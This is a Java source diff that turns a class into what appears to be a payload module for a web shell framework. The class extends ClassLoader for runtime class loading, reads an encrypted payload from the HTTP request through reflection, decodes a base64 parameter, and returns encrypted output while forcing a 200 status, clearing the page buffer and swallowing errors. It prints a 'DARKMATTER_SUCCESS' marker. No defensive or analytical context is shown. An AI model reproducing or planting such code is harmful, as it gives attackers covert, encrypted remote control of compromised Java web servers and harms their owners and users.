@@ -1,12 +1,15 @@
-import java.io.OutputStream;
-import java.io.PrintWriter;
-import java.io.StringWriter;
+import java.io.*;
 import java.lang.reflect.Method;
+import java.util.Base64;
 import java.util.HashMap;
 import java.util.Map;
+import java.nio.charset.StandardCharsets;
 
-public class file_init
+public class test extends ClassLoader
 {
+    public test(ClassLoader objParent) { super(objParent); }
+    public test() { super(test.class.getClassLoader()); }
+
     private Map<String, String> fnParseParams(String szParamStr)
     {
         Map<String, String> mapParams = new HashMap<String, String>();
@@ -23,6 +26,40 @@ public class file_init
             }
         }
         return mapParams;
+    }
+
+    private void fnWriteOutput(Object objParam, Object objResponse, OutputStream osClient, byte[] abResult)
+    {
+        if (abResult.length == 0)
+            abResult = "DARKMATTER_SUCCESS: Action executed but returned no output".getBytes();
+
+        Object objPageContext = objParam;
+
+        try
+        {
+            byte[] abEncryptedResult = Encrypt(objParam, abResult);
+            osClient.write(abEncryptedResult);
+            osClient.flush();
+
+            Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
+            fnSetStatus.invoke(objResponse, new Object[]{200});
+
+            try
+            {
+                Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
+                Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
+                Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
+                fnClear.invoke(objOut, new Object[0]);
+            }
+            catch (Exception exIgnored) {}
+
+            Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
+            fnFlushBuffer.invoke(objResponse, new Object[0]);
+        }
+        catch (Exception exIgnored)
+        {
+
+        }
     }
 
     private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
@@ -59,7 +96,7 @@ public class file_init
         Object objRequest = null;
         Object objResponse = null;
         OutputStream osClient = null;
-
+        
         try
         {
             Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
@@ -88,38 +125,12 @@ public class file_init
             String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();
 
             Map<String, String> mapParams = fnParseParams(szParam);
-            
-            
-            String szResult = "";
-            
+            String szSplitter = mapParams.get("splitter");
+            String z0 = mapParams.get("z0");
+            byte[] abDecoded = Base64.getDecoder().decode(z0);
+            String szPattern = new String(abDecoded, StandardCharsets.UTF_8);
 
-
-            byte[] abResult = szResult.getBytes();
-            byte[] abEncryptedResult = Encrypt(objParam, abResult);
-            osClient.write(abEncryptedResult);
-            osClient.flush();
-
-            try
-            {
-                Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
-                fnSetStatus.invoke(objResponse, new Object[]{200});
-
-                try
-                {
-                    Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
-                    Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
-                    Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
-                    fnClear.invoke(objOut, new Object[0]);
-                }
-                catch (Exception exIgnored) {}
-
-                Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
-                fnFlushBuffer.invoke(objResponse, new Object[0]);
-            }
-            catch (Exception exIgnored)
-            {
-
-            }
+            fnWriteOutput(objParam, objResponse, osClient, szPattern.getBytes());
         }
         catch (Exception ex)
         {
